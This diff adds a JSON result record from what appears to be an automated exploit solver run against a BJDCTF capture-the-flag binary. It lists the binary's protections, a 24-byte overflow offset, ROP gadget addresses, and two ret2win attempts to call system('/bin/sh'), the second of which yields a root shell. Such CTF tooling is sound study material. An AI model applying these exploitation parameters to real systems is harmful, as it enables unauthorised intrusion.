@@ -1,0 +1,55 @@
+{
+  "name": "ch03_58a4",
+  "ok": true,
+  "strategy": "ret2win",
+  "detail": "jump to system(\"/bin/sh\") @ 0x4006e6 off=24 align=1",
+  "elapsed": 1.6,
+  "attempt_count": 2,
+  "flag_only": false,
+  "facts": {
+    "prot": {
+      "arch": "amd64/64",
+      "pie": false,
+      "canary": false,
+      "nx": true,
+      "relro": "Partial",
+      "static": false
+    },
+    "vulns": [
+      "__isoc99_scanf@0x40079d disp=None off=None",
+      "read@0x4007c0 disp=-16 off=24"
+    ],
+    "wins": [
+      "shell@0x4006e6(system(\"/bin/sh\"))"
+    ],
+    "binsh": "0x400858",
+    "gadgets": {
+      "pop_rdi": "0x400833",
+      "pop_rbp": "0x400650",
+      "ret": "0x400561",
+      "leave": "0x4007ca"
+    },
+    "csu": true,
+    "mmap_rwx": null,
+    "fmt_buf": null,
+    "libc": null,
+    "notes": []
+  },
+  "attempts": [
+    {
+      "strategy": "ret2win",
+      "desc": "jump to system(\"/bin/sh\") @ 0x4006e6 off=24 align=0",
+      "ok": false,
+      "elapsed": 0.46,
+      "tail": "**********************************\n*     Welcome to the BJDCTF!     *\n* And Welcome to the bin world!  *\n*  Let's try to pwn the world!   *\n* Please told me u answer loudly!*\n[+]Are u ready?\n[+]Please input the length of your name:\n[+]What's u name?\n"
+    },
+    {
+      "strategy": "ret2win",
+      "desc": "jump to system(\"/bin/sh\") @ 0x4006e6 off=24 align=1",
+      "ok": true,
+      "elapsed": 1.01,
+      "tail": "*******************************\n*     Welcome to the BJDCTF!     *\n* And Welcome to the bin world!  *\n*  Let's try to pwn the world!   *\n* Please told me u answer loudly!*\n[+]Are u ready?\n[+]Please input the length of your name:\n[+]What's u name?\nPWNED_42\nroot\nuid=0(root) gid=0(root) groups=0(root)\n"
+    }
+  ],
+  "error": ""
+}
